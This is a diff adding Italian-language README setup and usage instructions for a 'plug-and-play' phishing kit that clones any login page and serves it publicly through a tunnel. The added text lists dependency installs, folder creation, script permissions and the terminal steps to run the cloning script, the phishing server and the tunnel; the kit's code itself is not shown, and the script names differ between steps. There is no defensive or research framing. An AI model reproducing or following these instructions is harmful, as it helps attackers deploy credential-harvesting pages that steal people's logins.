@@ -15,3 +15,49 @@ Phishing kit **plug-and-play** che clona **qualsiasi pagina login**, hosta con *
 ### Python 3.9+
 ```bash
 /Library/Frameworks/Python.framework/Versions/3.9/bin/python3 --version
+```
+### **DIPENDENZE**
+```
+pip install flask requests beautifulsoup4 lxml
+```
+
+## SSH (già presente su Mac/Linux)
+```
+ssh -V
+```
+
+## 1. Clona struttura
+```
+mkdir phishing_kit && cd phishing_kit
+mkdir -p templates static/{css,js,images}
+```
+
+## 2. Venv + deps
+```
+/Library/Frameworks/Python.framework/Versions/3.9/bin/python3 -m venv venv39
+source venv39/bin/activate
+pip install flask requests beautifulsoup4 lxml
+```
+
+## 3. Permessi script
+```
+chmod +x new_target.sh start_pinggy.sh
+```
+
+# 🎯 UTILIZZO
+
+## NEW TARGET (1 TERMINALE)
+```
+./new_target.sh
+python3.9 clone_phish.py
+```
+
+## AVVIO SERVER (2 TERMINALE)
+```
+python3.9 server.py
+```
+## AVVIO PINGGLY (3 TERMINALE)
+```
+./pinggly.sh
+```
+
